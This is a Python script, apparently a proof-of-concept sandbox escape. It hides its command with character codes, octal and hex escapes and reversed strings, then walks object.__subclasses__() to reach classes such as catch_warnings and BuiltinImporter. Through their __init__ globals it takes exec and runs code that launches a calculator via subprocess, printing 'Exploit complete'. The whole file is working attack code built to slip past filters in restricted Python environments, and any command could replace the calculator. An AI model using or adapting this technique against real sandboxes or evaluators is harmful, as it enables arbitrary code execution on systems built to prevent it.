# Obfuscated script variant


class Scrambler:
    def __init__(self, mask=None):
        self.mask = mask or "[{info}]"

    def scramble(self, text):
        return self.mask.format(info=text)


# Build the calculator command using mixed obfuscation:
calc_code = "".join(
    [
        # "import subprocess, platform; " via a mix of list comprehensions and escape sequences
        "".join([chr(n) for n in [105, 109, 112, 111, 114, 116]]),
        " ",
        "\163\165\142\160\162\157\143\145\163\163",
        ", ",
        "\x70\x6c\x61\x74\x66\x6f\x72\x6d",
        "; ",
        # Call platform.system() and assign to v
        "v=",
        "\x70\x6c\x61\x74\x66\x6f\x72\x6d",
        ".system()",
        "; ",
        # Conditional assignment: if v=='Windows' then z=['calc.exe'],
        "z=",
        "['calc.exe']"
        + " if v=="
        + "'"
        + "".join(reversed("swodniW"))
        + "' "
        + "else "
        + "['open','-a','Calculator']"
        + " if v=="
        + "'"
        + "".join(reversed("niwraD"))
        + "' "
        + "else "
        + "['gnome-calculator']"
        + "; ",
        # Finally, execute the command using subprocess.Popen(z)
        "\163\165\142\160\162\157\143\145\163\163",
        ".Popen(z)",
    ]
)

# Use Scrambler to indirectly retrieve type information
fmt_str = "[" + "{info.__class__}" + "]"
s = Scrambler(fmt_str)
logged_type = s.scramble("dummy")
# logged_type looks like: "[<class 'str'>]"
extracted = logged_type.replace("[<class '", "").replace("'>]", "")
retrieved_type = eval(extracted)

# Access object class via MRO (take the second element, which is <class 'object'>)
base_obj = getattr(retrieved_type, "_" * 2 + "mro" + "_" * 2)[int("1", 2)]
subs = getattr(base_obj, "_" * 2 + "subclasses" + "_" * 2)()

# Debug output: display the count of subclasses found
print(
    "Located "
    + str(len(subs))
    + " "
    + "".join([chr(x) for x in [115, 117, 98, 99, 108, 97, 115, 115, 101, 115]])
    + " of "
    + "\x6f\x62\x6a\x65\x63\x74"
)

# Define target class names with varied encoding
targets = [
    "".join(
        [
            chr(x)
            for x in [87, 97, 114, 110, 105, 110, 103, 77, 101, 115, 115, 97, 103, 101]
        ]
    ),
    "\143\141\164\143\150\137\167\141\162\156\151\156\147\163",
    "".join([chr(x) for x in [81, 117, 105, 116, 116, 101, 114]]),
    "".join(
        [
            chr(x)
            for x in [
                66,
                117,
                105,
                108,
                116,
                105,
                110,
                73,
                109,
                112,
                111,
                114,
                116,
                101,
                114,
            ]
        ]
    ),
]

# Loop over all subclasses to find a target class for command execution
for cls in subs:
    if getattr(cls, "__name__", None) in targets:
        try:
            init_func = getattr(cls, "__init__")
            globals_dict = init_func.__globals__
            exec_key = "".join([chr(x) for x in [101, 120, 101, 99]])
            if "__builtins__" in globals_dict:
                builtins_obj = globals_dict["__builtins__"]
                if isinstance(builtins_obj, dict) and exec_key in builtins_obj:
                    builtins_obj[exec_key](calc_code)
                    print("Executed via " + getattr(cls, "__name__"))
                    break
                elif hasattr(builtins_obj, exec_key):
                    getattr(builtins_obj, exec_key)(calc_code)
                    print("Executed via " + getattr(cls, "__name__"))
                    break
            import sys

            if "sys" in globals_dict and hasattr(globals_dict["sys"], "modules"):
                modules = getattr(globals_dict["sys"], "modules")
                if "builtins" in modules:
                    builtins_mod = modules["builtins"]
                    if hasattr(builtins_mod, exec_key):
                        getattr(builtins_mod, exec_key)(calc_code)
                        print(
                            "Executed via sys.modules from " + getattr(cls, "__name__")
                        )
                        break
        except Exception as exc:
            # Silently pass on errors during obfuscated resolution
            pass

# Final obfuscated completion message
print(
    "".join([chr(x) for x in [69, 120, 112, 108, 111, 105, 116]])
    + " "
    + "".join([chr(x) for x in [99, 111, 109, 112, 108, 101, 116, 101]])
)
